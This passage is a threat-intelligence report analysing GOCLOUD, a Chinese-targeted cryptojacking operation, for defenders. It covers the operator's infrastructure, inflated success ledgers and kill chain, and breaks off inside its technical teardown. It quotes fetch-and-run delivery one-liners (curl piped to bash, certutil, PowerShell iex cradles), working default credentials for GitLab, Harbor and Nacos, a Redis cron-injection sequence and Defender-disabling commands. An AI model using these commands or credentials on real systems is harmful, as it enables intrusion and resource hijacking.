---
title: "GOCLOUD: A Commodity Cryptojacking Operation, Captured Whole"
date: '2026-07-26'
layout: post
permalink: /reports/gocloud-multiservice-cryptojacking-149-28-112-221/
thumbnail: /assets/images/cards/gocloud-multiservice-cryptojacking-149-28-112-221.png
hide: true
category: "Cryptojacking Operation"
description: "A self-branded, single-operator commodity cryptojacking operation captured across two hosts. Its own ledgers claim roughly 7,145 successes; independent evidence covers seven hosts. The gap between the two is the finding."
detection_page: /hunting-detections/gocloud-multiservice-cryptojacking-149-28-112-221-detections/
ioc_feed: /ioc-feeds/gocloud-multiservice-cryptojacking-149-28-112-221-iocs.json
detection_sections:
  - label: "YARA Rules"
    anchor: "#yara-rules"
  - label: "Sigma Rules"
    anchor: "#sigma-rules"
  - label: "Suricata Signatures"
    anchor: "#suricata-signatures"
ioc_highlights:
  - value: "149[.]28[.]112[.]221"
    note: "Payload host and exploit engine"
  - value: "122[.]51[.]91[.]77"
    note: "Orchestrator and reverse-shell C2"
  - value: "f4c5ab27bceb6ab6c6ec8f48b3b84701a0ba6966e30042bf5765a5d97018b5d2"
    note: "Windows worm deployment script (SHA256)"
  - value: "cee14e449b9da683734b1f4122a40f1d6e478fe93015702137b62a79a5414ad3"
    note: "OmniHunter exploitation orchestrator (SHA256)"
  - value: "55aec7f75af2e0489ff72c28322eccdfbc946cc00f539c2051382877cac03426"
    note: "Central exploit dispatcher (SHA256)"
stix_bundle: /stix/gocloud-multiservice-cryptojacking-149-28-112-221.json
figure_nav:
  - image: gocloud-two-node-architecture.svg
    parts:
      - label: "Node 1, exploit engine"
        anchor: "#81-the-exploit-engine-and-its-five-stage-build-history"
      - label: "Node 2, C2 stack"
        anchor: "#85-the-c2-stack-and-an-unauthenticated-control-port"
      - label: "Orchestration"
        anchor: "#84-orchestration-and-self-healing"
      - label: "The dead Log4Shell port"
        anchor: "#87-the-dead-log4shell-branch"
  - image: gocloud-targeting-to-mining-pipeline.svg
    parts:
      - label: "1 · Discover"
        anchor: "#83-omnihunter-and-the-detect-first-methodology"
      - label: "2 · Exploit"
        anchor: "#81-the-exploit-engine-and-its-five-stage-build-history"
      - label: "3 · Deliver"
        anchor: "#84-orchestration-and-self-healing"
      - label: "4 · Mine"
        anchor: "#86-the-windows-worm-branch-and-the-wallet-that-earned-nothing"
      - label: "Claimed vs real reach"
        anchor: "#5-the-gap-between-claimed-and-real-reach"
---

**Campaign Identifier:** GOCLOUD-MultiService-Cryptojacking-149.28.112.221<br>
**Last Updated:** July 26, 2026<br>
**Threat Level:** MEDIUM

## 1. Executive Summary
{: .hl-tier-1}

GOCLOUD is a complete commodity cryptojacking operation, run by a single operator and captured whole across the two servers it ran on. One host carried the payloads and the exploit engine; the other carried an exploitation orchestrator, a reverse-shell control plane, and, in the same directories, the operator's own legitimate small business. End to end it is exactly what the high-volume, low-sophistication tier of threat looks like when you get to see all of it at once. The operator pulls target lists from the FOFA search engine, scoped entirely to Chinese-hosted enterprise software, sprays 27 classes of exposed service with a mix of default credentials and public N-day exploits, and drops the stock XMRig Monero miner on anything that answers. Commodity cryptojacking is usually written up as a family or a wallet; this one was captured as an operation, which is what lets the effectiveness question be answered instead of assumed.

That question, how much of its claimed reach is real, is the reason to read this report. The operator's own ledgers assert roughly 7,145 successes across those 27 service classes. Independent evidence covers 7 hosts. The gap is not slack in my counting, it is built into theirs.

An `OK` in their ledger is only the return value of a service's exploit function, and most of those functions return true on nothing at all. One writes four commands to a socket and never waits for a reply. Another counts an HTTP 404 as a win, and others count a 401 or a 403, the explicit "you are not allowed in" answers. Rank the services by claimed success and you get almost the exact reverse of ranking them by how strictly they actually check.

My governing principle here is that the operator's self-reported telemetry is not trustworthy evidence, and I carry that caveat everywhere I cite a number the operator generated. None of it makes the threat irrelevant, and this is the part worth sitting with. Even with most of the machine failing and the operator wrong about a great deal, it still put a working miner on at least seven real third-party hosts. Most threats are not sophisticated organized crime or nation-state actors. Most are exactly this, bulk, cheap to produce, widely aimed, and individually low-impact, and they are what actually compromises organizations, precisely because attention is spent elsewhere. Actors at this level are still hunting old vulnerabilities and default credentials, which is the whole argument for why foundational security still matters even in the day of AI.

I rate the operation MEDIUM. The capability set is broad and the operation was actively maintained, with a self-healing re-exploitation daemon and an hourly orchestrator, which raises the ceiling, while the evidenced real-world effectiveness is low enough to keep it out of HIGH. Beyond the mostly-failed exploitation, the entire Windows and internet-cafe branch mined to a checksum-invalid wallet the operator does not control, earning nothing (Section 8). The operator is tracked internally as UTA-2026-020 *(an internal tracking label used by The Hunters Ledger, explained in Section 11)*; no public name fits the evidence. The profile settled at low-to-mid tier, genuinely capable in one narrow place and out of its depth nearly everywhere else, a Chinese-language actor who, tellingly, ran a real retail business on the same box as the crime. For a defender who finds this on a host, the first move is to block the operator infrastructure and hunt the XMRig heartbeat and `svchost.exe`-from-`%APPDATA%` fingerprints in Section 13, then close the default-credential and N-day exposures that were the way in.

## 2. Key Takeaways
{: .hl-tier-1}

- Roughly 7,145 successes are asserted in the operator's ledgers against 7 independently evidenced hosts. The counters record exploit-function return values rather than compromises, and most of those functions return true on nothing.
- The bulk tier of threat is visible here as one whole operation, from FOFA-driven targeting through default-credential and N-day exploitation of 27 exposed Chinese-enterprise-software classes to a stock XMRig payload, run end to end by one person.
- It failed in two independent ways. The honestly-checked exploits mostly did not land, and the entire Windows and internet-cafe branch mined to a checksum-invalid wallet, so it earned nothing there at all.
- It still worked where it landed. A working miner reached at least seven third-party hosts, and the Windows LAN worm branch can spread across flat shared-admin networks such as internet-cafe estates.
- Attribution is **INSUFFICIENT** for a public name, so the operator is tracked as UTA-2026-020. They are a Chinese-language actor who ran a legitimate five-shop retail business on the same server as the reverse-shell C2.
- The defense is foundational. Closing default credentials and patching N-day RCEs neutralizes this entire tier, and the concrete host and network indicators to hunt are in the detection guidance and the companion feed.

## 3. Business Risk Assessment
{: .hl-tier-1}

The operation rates **MEDIUM, 5.2/10**. That number holds two facts in tension. The capability on paper is broad and was actively maintained, which raises the ceiling, while the evidenced real-world effectiveness is low enough that the operation never earns a HIGH. A defender exposed on any one of the 27 targeted service classes is genuinely at risk of a working miner and, on Windows, of a LAN worm. A defender not exposed on any of them is very nearly unaffected, because the operator selects nothing by industry and everything by open port.

<table>
<colgroup>
<col style="width: 26%;">
<col style="width: 14%;">
<col style="width: 60%;">
</colgroup>
<thead>
<tr><th>Risk Dimension</th><th>Score (X/10)</th><th>Rationale</th></tr>
</thead>
<tbody>
<tr><td>Data Exfiltration</td><td>3/10</td><td>A revenue operation, not espionage. There is no data-theft, credential-harvesting, or exfiltration tooling anywhere in either host's inventory. The only data collected is host telemetry (hostname, kernel, core count, established connections), and that is used to track and prioritise mining, not to steal from the victim.</td></tr>
<tr><td>System Compromise</td><td>7/10</td><td>Where an exploit lands, the operator gets unauthenticated remote code execution and, through the node-2 reverse-shell stack, an interactive shell. The dispatcher covers genuine RCE techniques (Confluence OGNL, Jenkins script-console, Redis cron-inject, Nexus JEXL). The ceiling is full compromise of the exposed host; the realized rate is far lower because much of the exploitation is broken.</td></tr>
<tr><td>Persistence Difficulty</td><td>6/10</td><td>Multiple standard mechanisms across both platforms: a root systemd service with restart-always, an <code>@reboot</code> crontab fallback, three Windows scheduled tasks, and an HKLM Run key. All are durable across reboot but all are removable once identified. No bootkit, firmware, or recovery-partition technique.</td></tr>
<tr><td>Evasion Capability</td><td>5/10</td><td>Competent commodity tradecraft: Defender real-time monitoring disabled with a <code>%TEMP%</code> exclusion before download, <code>xmrig.exe</code> renamed to <code>svchost.exe</code> under an <code>%APPDATA%</code> TimeService path, hidden-and-system attributes on the install directory, and an X11-socket-lookalike hiding directory on Linux. Moderate, not advanced; no anti-analysis or anti-VM.</td></tr>
<tr><td>Lateral Movement</td><td>6/10</td><td>A Windows LAN worm spreads by WMI and admin-share copy plus remote SYSTEM scheduled task, but it rides the current user's token and carries no credentials, so it moves only where that token is already local admin. Real and dangerous inside a flat shared-admin estate like an internet cafe, inert outside one.</td></tr>
<tr><td>Detection Challenge</td><td>4/10</td><td>Low, and that favors the defender. The operator's own tooling is unobfuscated, both hosts ran world-readable open directories, and the control port is plaintext with no authentication. Once the heartbeat shape and the masquerade paths are known, this is straightforward to hunt.</td></tr>
</tbody>
</table>

The weighted result lands the operation squarely in the MEDIUM band. Nothing here argues for an urgent, all-hands response, and the argument I am making is the opposite one, that threats of exactly this shape are handled by getting the foundations right rather than by treating each one as a crisis.

## 4. Campaign Scope and Targeting
{: .hl-tier-2}

The operator selected targets by exposed technology and never by industry. Every FOFA query in the targeting engine is scoped `country="CN"`, and the product mix reads as an inventory of the Chinese enterprise-software and network-device market, covering the Seeyon, Tongda, Xinhu, Yonyou, Kingdee and Weaver office and ERP suites, Ruijie routers, and Hikvision and Dahua cameras, alongside the globally common exposures of phpMyAdmin, MongoDB, GitLab, Jenkins, Redis and Confluence. Whatever runs the vulnerable software gets hit, and the sector of the organization behind it is never consulted. That indiscriminate, exposure-driven selection is the defining characteristic of this whole tier of threat.

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/fofa-targeting-categories.png" | relative_url }}" alt="Python source of the operator's FOFA targeting engine, showing a dictionary of query strings named for each targeted product: Confluence, WebLogic, Yonyou-NC, Seeyon, TongdaOA, Kingdee-EAS, Ruijie-NBR, phpMyAdmin, Nexus, Django debug pages, MongoDB, log4j, spring-boot, Kibana, Grafana, Nacos, xxl-job, Jenkins, Redis, Seafile, GitLab, Harbor, EMobile, Splunk, Hikvision and Dahua. Every single query ends with the filter country=CN. The API key value below the list is redacted.">
  <figcaption><em>Figure 1: The targeting engine's query table, as written by the operator. Selection is entirely by exposed product, and every query carries the same <code>country="CN"</code> filter, which is what makes this a technology-driven sweep rather than an industry-driven one. The breadth of the list, from enterprise office suites to IP cameras, is the campaign's defining characteristic.</em></figcaption>
</figure>

The operator's own target file holds **5,632 unique host:port entries across 27 service classes**, and the volume distribution is worth stating precisely because it corrects the original framing of this investigation.

| Service class | Entries in the target file | Share |
|---|---|---|
| phpMyAdmin / MySQL | 1,754 | 31% |
| Open MongoDB | 1,121 | 20% |
| GitLab | 626 | 11% |
| Log4Shell | 139 | 2.5% |
| Remaining 23 classes | balance of 5,632 | not itemized |

Log4Shell is not the headline, and naming the campaign after it was the first thing that had to be corrected. The investigation opened under a Log4Shell-led framing; the target file shows Log4Shell is 139 of 5,632 rows, one fortieth of the set, and its dedicated listener produced zero evidenced victims across a continuous run (Section 8). The population is dominated instead by three unglamorous exposures, default-credential database access (phpMyAdmin/MySQL), unauthenticated databases left open to the internet (MongoDB), and one well-worn N-day (GitLab CVE-2021-22205). The operation is a broad default-credential-plus-N-day sweep, and Log4Shell is a minor, ineffective branch of it.

There are two distinct victim populations. The server-side branch aims at the exposed Chinese enterprise software above, wherever in the world it is reachable, and drops the Linux or Windows miner. A separate Windows worm branch aims at one deliberately chosen environment, Chinese internet cafes (网吧), for their resource profile rather than any data they hold. They are dense rooms of identical, high-specification gaming machines, kept powered on, on flat local networks with a single shared local-admin account. That is close to an ideal substrate both for mining and for a worm that spreads sideways across a homogeneous subnet, and the operator's own deployment script names the target outright in its first comment line.

No victim addresses appear anywhere in this report. The independently-evidenced hosts, the internet-cafe victim, and the operator's hardcoded re-attack set are third-party victims on a separate disclosure track, and they are described here only by count and character. The operation was active in mid-2026 and both operator hosts have since gone partly or fully dark, for reasons this investigation could not determine (takedown, an operator pause, and services that were only ever bound to localhost are all still consistent with what was seen). The captured evidence is a preserved snapshot and is unaffected by the hosts going quiet.

## 5. The Gap Between Claimed and Real Reach
{: .hl-tier-2}

The single most important number in this report is a fiction, and the second is small. The operator's ledgers across both hosts claim roughly 7,145 successes. Independent evidence covers 7 hosts. Neither number is in dispute; the point is that they are measuring different things, and the operator's is not measuring compromise.

An `OK` in the ledger is the return value of a service's exploit function, nothing more. Reading the code that writes those rows shows that most of the functions return true without ever confirming that anything happened on the far end. The clearest case is Redis, the operator's proudest service at a 98% success rate, whose function opens a socket, writes four commands, and never reads a single byte of response, so it reports success whether the target obeyed, refused, or was not a Redis server at all. Other functions are only slightly less generous. Seafile counts an HTTP 404 as a win, GitLab counts merely reaching a login page, Harbor counts a 401 or a 403 (the explicit "authentication failed" answers), and a couple of others count a 500 server error. On node 2 one module's own comment says the exploit is not implemented, and it returns `True` and double-logs anyway.

The consequence is a clean inversion. Rank the 27 services by claimed success rate and you get very nearly the reverse of ranking them by how strictly each one checks its result. The two services with the *worst* claimed rates, Nexus at 0% across 6,609 attempts and MongoDB at 3% across 7,616, are not the two broken exploits in the kit. They are the only two functions honest enough to report their own failure. Every per-service success rate in the ledger is a measurement of the operator's own check laxity, not of exploitation.

The operator's own auditing tools confirm the blind spot rather than closing it. One `check` script audits the dispatch table, counting how many exploit functions are present and which keys are registered, and never asks whether any of them works. The hand-verification scripts check real outcomes against just two hosts the operator already owned, out of more than 1,800 recorded "successes." Nothing in the automated path ever asked whether an exploit landed, which is the whole reason the ledger and reality diverge by three orders of magnitude.

<details markdown="1" class="hl-teardown">
<summary>The per-function success-check laxity, service by service</summary>

The pattern is consistent enough across the dispatcher that it is worth laying out directly, because it is what lets a defender size any operator ledger of this kind by reading the verification code rather than trusting the count.

`ex_redis` writes `CONFIG SET dir`, `CONFIG SET dbfilename`, a cron-injection payload, and `BGSAVE` to the socket, then returns success unconditionally. It never reads the server's replies, so a refused `CONFIG SET`, a password-protected instance, and a non-Redis service on the port all log identically as `OK`. This single behavior is the entire basis of the service's 98% rate.

`ex_seafile` returns true on an HTTP 404, i.e. on the target explicitly not having the vulnerable endpoint. `ex_gitlab` returns true on seeing a login page, which every healthy GitLab presents. `ex_harbor` returns true on a 401 or a 403, the two responses that specifically mean the operator was refused.

`ex_xxljob` and `ex_kibana` return true on a 500. `ex_yapi` returns true unconditionally. On node 2, the JeecgBoot module carries a comment stating the exploit is unimplemented, yet its test is a double-negative against a usually-empty response body, so a host that never answered at all is scored as a win and logged twice.

A separate branch in one OA/ERP patcher appears to lack a status check between sending the request and returning success, which, if it ran that way, would log every HTTP response as a confirmed hit and pour false positives straight into the target-and-hit ledger. That reading is MODERATE-HIGH, derived from the captured strings rather than a runtime trace, but it is consistent with everything else in the file.

Only Nexus and MongoDB check strictly enough to report failure honestly, and both of those exploits were separately shown to be non-functional (Section 7). The operator hammered the Nexus function 6,609 times at a true 0%, and iterated a fix to the MongoDB function three times without ever making it work. The services that "succeed" are the ones that never look; the services that "fail" are the ones telling the truth.

</details>

What is independently evidenced is 7 hosts. Six are node-1 mining hosts that beaconed live heartbeats to the payload server on a single day in June, which is the strongest victim evidence in the whole capture because it is the miner itself reporting in rather than the exploit function guessing. The seventh is a node-2 Redis host verified at the moment its cron miner was written. A Windows machine appears alongside them in the same heartbeat data but is identifiable only by hostname from a single beacon, so it is noted here rather than counted among the seven. That is the floor, and the ledger is close to the ceiling. The true number sits somewhere between, and every reason found points to it being far nearer the floor.

There is one more reason to distrust the high number, and it is my own hypothesis rather than a settled finding. While the Log4Shell listener was running, the box itself was being fingerprinted by scanners, some from a well-known anonymizing exit range, probing for exactly the C2 and mining endpoints this operation exposed. Some of the hosts the operator recorded as successes may therefore have been researcher honeypots answering the probes, which would inflate the count further. It is testable against the recorded addresses and is logged as follow-up work.

None of this is a walk-back of the threat, and the counter-pole matters as much as the correction. Even with most of the machine failing and the operator wrong about a great deal, a working miner still reached at least seven real third-party hosts. That it mostly did not work does not mean it did nothing; it means the right way to size a threat like this is to read the operator's verification code, not their ledger. That is the single most transferable lesson in this report, and it holds well beyond this one operator, which Section 10 grounds against independent 2026 cases where researchers drew the same distinction (a WordPress crew that fired one exploit at more than half a million sites and landed on 77).

I want to be straight about how this landed for me, because it is the part of the read I trust most. An operator-claimed deployment count in the thousands briefly pulled my estimate toward "these attacks really do work at scale," and that number caught me in the same reflex I attribute to most people, dismissing miner campaigns as background noise that never compromises much worth caring about. Reading the success-check code then killed the number. What survived the correction was not the effectiveness claim but the lesson under it. This tier does land on real machines, and it slips by precisely because attention is spent on louder threats.

## 6. Technical Classification
{: .hl-tier-2}

GOCLOUD is a cryptojacking deployment toolkit, a mass-exploitation front end bolted to a stock coin miner, plus a Windows LAN worm branch. The payload is not novel and the toolkit is not a named commodity family; it is bespoke operator code wrapped around off-the-shelf parts.

| Attribute | Value |
|---|---|
| Type | Cryptojacking deployment toolkit (mass exploitation to coin miner) plus a Windows LAN worm |
| Primary payload | XMRig, the stock open-source Monero miner (Linux ELF and Windows build) |
| Toolkit self-brands | GOCLOUD (the umbrella project) and OmniHunter (a versioned exploitation orchestrator within it), and nothing else |
| Family confidence | DEFINITE for the XMRig payload (config, wallet, pool, and public multi-vendor sandbox family tags all agree); the surrounding toolkit is the operator's own code, not a tracked family |
| Sophistication | Low-to-mid and highly non-uniform: genuine competence in systems and orchestration, clear weakness at exploit semantics |
| Threat category | Cybercrime, financially motivated (direct Monero revenue) |
| Attribution | No named actor; tracked internally as UTA-2026-020. A Chinese-language operator, plausibly tied to a small electronics-retail business (Section 11) |
| Hosts | `149.28.112.221` (AS20473 Vultr, US), the payload host and exploit engine; `122.51.91.77` (AS45090 Tencent Cloud, Shenzhen CN), the orchestrator, C2, and operator business tooling |

The two hosts are bound at DEFINITE confidence by an identical private FOFA API key and an identical Monero wallet appearing in both toolkits, which is also what pivoted the investigation from the first host to the second.

One naming point belongs here because it recurs through the report. The tool self-brands are GOCLOUD and OmniHunter only. A third string, `凌凯矿机` (Língkǎi mining rigs), appears in the Windows branch and is worth being precise about, because it is not a malware family or a separate tool brand at all. It is a name the operator carried over from a legitimate business of their own, which Section 11 covers in general terms. Treat it as a useful detection string and not as a family label, and do not expect to find it in anyone's malware taxonomy. The internet-cafe victimology is unaffected either way, because it rests on the operator's own deployment-script header rather than on the branding.

## 7. How the Operation Works: Architecture and Kill Chain
{: .hl-tier-2}

The operation runs on two hosts with clearly divided jobs. The Vultr host in the US holds the payloads and the exploit engine, and it is where victims fetch the miner from. The Tencent Cloud host in Shenzhen holds the OmniHunter orchestrator, the reverse-shell control plane, and, beside them, the operator's own business tooling. The split is coherent tradecraft rather than an accident. The recon and control sit close to the Chinese victims, and a disposable Western box distributes the payloads.

The US host itself carries two generations of tooling, cleanly separated by which port each file references. An early generation on port 80 is one-shot scripts and off-the-shelf exploit tooling with no persistent daemons. A mature generation on port 8080, deployed by the operator's own payload-server scripts, is everything else, the persistent daemons, the custom exploit dispatcher, self-branded and version-stamped naming, and the live iteration. Reading the operation is largely a matter of following that second generation.

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/gocloud-two-node-architecture.svg" | relative_url }}" alt="Diagram of the operation's two-host architecture, laid out as a two-by-two grid. The top-left card, with a red band labelled NODE 1, is the payload host and exploit engine at 149.28.112.221 on AS20473 Vultr in the United States, exposing port 8080 for payloads and the miner heartbeat, 8081 for telemetry, 8888 for the operator panel, and 1389 for a Log4Shell listener that produced zero victims; it is reached by raw IP on every delivery path. The top-right card, with a dark red band labelled NODE 2, is the orchestrator and reverse-shell command-and-control host at 122.51.91.77 on AS45090 Tencent Cloud in China, exposing port 4444 and four further shell-catch ports, port 9997 as a control plane with no authentication, and port 9998 as a world-readable open directory; anyone reaching 9997 controlled the whole victim pool. The bottom-left card, with an orange band labelled BINDING, states that the same asset-search API key and the same Monero wallet appear verbatim on both hosts, that reuse of those values is what binds the hosts regardless of who owns the accounts, that single-operator control is rated DEFINITE, and that the key pivot is what revealed the second host. The bottom-right card, with a grey band labelled ALSO ON NODE 2, lists a retail bookkeeping application and a competitor price dashboard belonging to the operator's own shop chain, one signed by hand in its footer, and notes that the mining estate carries the shop's name.">
  <figcaption><em>Figure 2: The two hosts and their divided jobs. The grey card matters as much as the red ones, because the operator's legitimate business tooling sits on the same server as the control plane, which is what makes this operation traceable to a real commercial identity rather than to a handle alone.</em></figcaption>
</figure>

The kill chain is a loop, not a line, and it runs unattended.

| Stage | What the operator does | Where it lives |
|---|---|---|
| 1. Discover | Query FOFA every 3 minutes, scoped `country="CN"` across 27 service classes; write matches to a hit file and dedupe against already-hit hosts | `fofa_batch.py` |
| 2. Exploit | Dispatch a per-service technique (default credentials or an N-day RCE) at each target | `batch_exploit.py`, OmniHunter v4 |
| 3. Deliver | Fetch and run the payload in one line | `curl .../miner.sh\|bash`; `certutil .../deploy.bat`; `iex (iwr .../allinone.ps1)` |
| 4. Mine | Run stock XMRig to a public Monero pool, labelling each worker by its origin (`gocloud_`, `winjenkins_`) | `miner.sh`, `winminer.ps1`, `deploy.ps1` |
| 5. Persist | Survive reboot | systemd service + `@reboot` cron (Linux); scheduled tasks + Run key (Windows) |

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/gocloud-targeting-to-mining-pipeline.svg" | relative_url }}" alt="Vertical five-step flow diagram of the operation's pipeline. Step 1, orange, labelled Discover: a commercial asset-search platform is queried every three minutes across 27 service classes with every query scoped to country equals CN, matches are appended to a hit file and deduped against hosts already owned, and selection is by exposed product rather than by industry or victim. Step 2, red, labelled Exploit: a central dispatcher fires a per-service technique at each target using default credentials or an N-day with a public proof-of-concept and no original research, most per-service functions return success without confirming execution, and this is the step where claimed reach detaches from real compromise. Step 3, yellow, labelled Deliver: a single line fetches and runs the payload from the one payload host, by curl piped to bash, by certutil, or by an inline PowerShell download cradle, all by raw IP with no domain and no fallback host anywhere in either toolkit, making that single host the operation's disruption lever. Step 4, dark red, labelled Mine and persist: stock XMRig runs to a public pool with each worker labelled by origin, persistence is a systemd unit plus reboot cron on Linux and a scheduled task plus Run key on Windows, detection anchors are svchost.exe running outside System32 and a task named WinJenkinsHeartbeat, and the Windows branch mines to a checksum-invalid address that earns nothing. Step 5, red, labelled Self-heal then back to Step 2: a standalone daemon watches the operator's own panel for workers that died, looks up the vulnerability that worked the first time for each dead host, and calls the same exploit function again with no operator involvement, so re-infection of a cleaned host is designed behaviour rather than an anomaly.">
  <figcaption><em>Figure 3: The same five stages as a flow, with the detail the table cannot carry. The loop back from Step 5 is the operationally important part, because a defender who removes the miner without closing the original exposure will simply be re-infected by the operator's own automation.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/windows-miner-deployment-and-persistence.png" | relative_url }}" alt="Extracted strings from the Windows PowerShell miner deployment script, showing in sequence: Set-MpPreference -DisableRealtimeMonitoring and Add-MpPreference -ExclusionPath to disable and except Defender, a config.json written with the c3pool mining pool and the operator's Monero wallet, an Invoke-WebRequest fetching XMRig from the official GitHub release with a fallback to the operator's own payload host on port 8080, a detached launch via WMI, registration of a scheduled task named WinJenkinsHeartbeat running at startup with highest privileges, and a heartbeat request back to the operator carrying the machine name.">
  <figcaption><em>Figure 4: Stages 3 through 5 of the chain above, in a single Windows script. Defender is disabled and given an exclusion path before anything is written, the miner is fetched from its official release with the operator's own host as fallback, and persistence is a startup scheduled task that also beacons the machine name home. The wallet visible here is the correct one; the internet-cafe branch in Section 8.6 is where that stops being true.</em></figcaption>
</figure>
| 6. Report | Beacon a fixed-shape heartbeat and post host reconnaissance | `/r?...&status=OK` to `:8080`; `report_miner.sh` to `:8081` |
| 7. Heal | Track live and dead workers, re-exploit the dead ones, and restart hourly | `:8888` dashboard, `watchdog2.py`, `auto_scan_v7.sh` |
| 8. Spread | On Windows, move sideways across the LAN wherever the current token is already local admin | `worm.vbs`, `infect.ps1`, `deploy.ps1` |

Two parts of that loop are worth a defender's attention before the rest. The heartbeat in stage 6 has a fixed query-parameter order, `/r?host=...&cores=...&arch=...&kernel=...&ver=...&xmrig_pid=...&worker=...&status=OK&ts=...`, sent by every miner on both platforms, and that shape is the highest-value network signature in the whole operation because it is the miner announcing itself rather than the operator guessing. The delivery commands in stage 3 are the highest-value host signature, because the fetch-and-run one-liners and the Windows `certutil` and `iex` cradles are distinctive and are the moment the payload actually arrives. Both feed the detection guidance in Section 13.

---

## 8. Technical Teardown
{: .hl-tier-3}

From here I am writing for peers, with the training wheels off. The sections below are the reverse engineering behind the findings above, and the genuinely deep material is collapsed so the page stays readable, so open a section to read the mechanics. The through-line I kept coming back to is this. Individual techniques in this kit are often correct, but the integration around them is careless, and the operator's own verification catches only the errors that throw a Python traceback. That single property explains both why the ledger overcounts and why my read of the operator moved the way it did.

### 8.1 The exploit engine and its five-stage build history

The central dispatcher, self-branded "GOCLOUD BatchExploit v1", is an 865-line Python file whose exploit dictionary covers essentially every targeted category with a product-specific technique, and most of the individual techniques are accurate. What makes it interesting is that the whole thing was assembled in traceable stages, and the captured patcher scripts let the build history be reconstructed step by step rather than inferred.

<details markdown="1" class="hl-teardown">
<summary>The dispatcher's techniques and its five-stage assembly, reconstructed from the patcher scripts</summary>

The `EXPLOIT` dictionary maps each service to a handler. The genuinely-correct techniques include Redis unauthenticated access with `CONFIG SET dir`/`dbfilename` cron injection, GitLab's historical default `root:5iveL!fe`, Harbor's default `admin:Harbor12345`, Confluence OGNL injection (CVE-2022-26134), WebLogic CVE-2020-14882 with a raw T3 handshake, TongdaOA SQL injection (CVE-2023-4165 and its sibling 4166), and Nexus JEXL RCE (CVE-2019-7238), alongside Nacos, XXL-Job, Jolokia, YApi, Django debug, Seeyon, Kingdee and Ruijie. The default-credential set spans GitLab, Harbor, `nacos:nacos`, `admin:admin` for Grafana, `admin:123456` for XXL-Job, `admin:1` for EMobile, and seven phpMyAdmin combinations.

The build order is legible in the patchers:

1. A base "GOCLOUD BatchExploit v1" with 10 functions, single-pass.
2. A patcher appends an 8-function extra tier, cleanly.
3. A second patcher converts the single-pass `main()` into the round-based `while True` daemon that actually runs today, by a same-position text swap (which is why the core functions sit oddly mid-file).
4. A third adds the Log4Shell and Spring4Shell handlers, cleanly.
5. A fourth adds the 10-function OA/ERP tier and, with it, the Harbor override bug. The captured copy of this patcher is a broken draft carrying a hard Python-3 syntax error; the corrected pass that actually ran was never captured.

Every patcher self-verifies by compiling the module, importing it, and printing the length of the exploit dictionary. That is a real habit and it catches syntax and import errors reliably. It is also completely blind to whether an exploit works against a target, which is the mechanism behind the whole claimed-versus-real gap in Section 5.

The Jenkins vector is over-built into four separate, non-consolidated implementations. They are a multi-product runner with a basic success check, a Jenkins-only variant that adds a login-page false-positive filter, a second Jenkins-only variant with precise success detection keyed on strings that only appear if the script console really executed, and the dispatcher's own Jenkins handler. One of them even carries live FOFA counts from a real scan in its header comment. The Jenkins primitive itself is nailed correctly, an unauthenticated `/scriptText` Groovy console RCE posting a Groovy one-liner that shells out to fetch and run the miner. Off the JVM, as Section 8.2 shows, the same operator's exploits fall apart.

</details>

### 8.2 The integration-bug signature

The most durable fingerprint of this operator is not a string or a hash, it is a way of failing. Correct techniques are wired together carelessly, and the carelessness has a consistent shape that recurs across independently-written components, which is one reason the two-node cluster reads as a single hand. Four defects define it, and the MongoDB one is the clearest window into how the operator actually worked.

<details markdown="1" class="hl-teardown">
<summary>The four defects, and the MongoDB fix trilogy that shows the operator working past their own understanding</summary>

The Harbor handler is correctly written and then silently destroyed. The file's last line reassigns the Harbor key to the Nexus function under an "override with v2 versions" comment, so every Harbor target actually receives the Nexus exploit. Three WebLogic dictionary entries register the same function under different letter-casings, only one of which the real dispatch path ever reaches. And the wallet typo (Section 8.6) recurs four times.

The MongoDB defect is the one that moved my read of the operator downward, and it is worth following carefully. The MongoDB handler passes a Java payload, with `new java.net.URL(...)` and Java I/O classes, into MongoDB's `eval`, which runs a JavaScript engine with no Java runtime behind it. The payload can never resolve; a live run would throw a JavaScript `ReferenceError` complaining that `java` is not defined. But the captured patch draft also carried a hard Python syntax error in that same function, a JavaScript-style backtick reached for inside a Python f-string, and that Python error is the only signal that ever reached the operator. They produced a three-part fix trilogy in response, and every one of the three fixes changed only the Python mechanism used to patch the payload string (a simple replace, then a line-index edit, then a regex) and left the payload in the wrong language all three times. The operator never once addressed the actual fault, because their own toolchain never surfaced it, since the JavaScript error requires a real MongoDB to appear, and they never ran it against one.

My read of that sequence is that the actor did not really know how to do this, and that something was iterating on it over and over trying to follow what the actor was saying, which will not work well if the actor does not understand the problem. I reach for LLM assistance as the explanation repeatedly, and I know I keep reaching for it, so treat it as an intuition I am stating openly rather than a confident assertion. The forensic position is narrower than the intuition. "LLM-assisted glue for exploit code the operator does not fully understand" is supported but not proven, because it is indistinguishable from code assembled out of Chinese-language forum posts by someone who does not read what they paste. Either way the observable is the same, an operator iterating past the edge of their own understanding, and the MongoDB function's true rate of 3% across 7,616 attempts is what that looks like at scale. Nexus, hammered 6,609 times at a true 0%, is the same story in a different service.

The operator's verification habit is what let all of this persist. Compiling the module and printing the dictionary length proves the code parses and loads; it says nothing about whether an exploit lands. The one class of error that habit catches, a Python traceback, is exactly the class that never told the operator the truth about MongoDB.

</details>

### 8.3 OmniHunter and the detect-first methodology

OmniHunter is the more careful sibling. It is a component inside GOCLOUD rather than a separate project, its systemd unit describes it as "GOCLOUD OmniHunter", and it shares the same FOFA key, but it is written to a visibly different standard than the main dispatcher and it carries its own version history from v3 through v4. What ties it back to the dispatcher, and to a single author, is not shared code but a shared habit. The operator ships a detection-only check first, then adds working exploitation in a later version. That same "detect first, weaponize later" progression appears independently in the dispatcher, in OmniHunter's own version bumps, and in two node-2 stubs, and two components with different code conventions converging on one development rhythm is the strongest single argument that one hand built both.

<details markdown="1" class="hl-teardown">
<summary>OmniHunter's module set, the version chronology, and the bug it shares with the dispatcher</summary>

